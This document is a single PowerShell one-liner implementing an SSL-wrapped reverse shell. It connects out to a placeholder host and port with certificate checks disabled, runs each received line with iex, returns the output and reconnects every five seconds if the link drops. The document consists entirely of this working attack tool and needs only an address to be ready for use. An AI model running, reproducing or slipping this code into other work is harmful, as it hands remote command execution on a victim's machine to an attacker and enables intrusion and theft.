while($true){try{$a='0.0.0.0';$p=0000;$c=New-Object System.Net.Sockets.TCPClient($a,$p);$st=$c.GetStream();$ss=New-Object Net.Security.SslStream($st,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$ss.AuthenticateAsClient($a,$null,3072,$false);$w=New-Object System.IO.StreamWriter($ss);$w.AutoFlush=$true;$r=New-Object System.IO.StreamReader($ss);$w.WriteLine("`n[*] Interactive SSL Session Established`n");while($c.Connected){$w.Write("PS "+(pwd).Path+"> ");$l=$r.ReadLine();if($l -eq 'exit'){break}elseif($l -eq 'clear' -or $l -eq 'cls'){$w.Write("`e[2J`e[H")}elseif($l){try{$o=iex $l 2>&1 | Out-String;$w.Write($o)}catch{$w.Write($_.Exception.Message + "`n")}}}$c.Close()}catch{Start-Sleep -s 5}}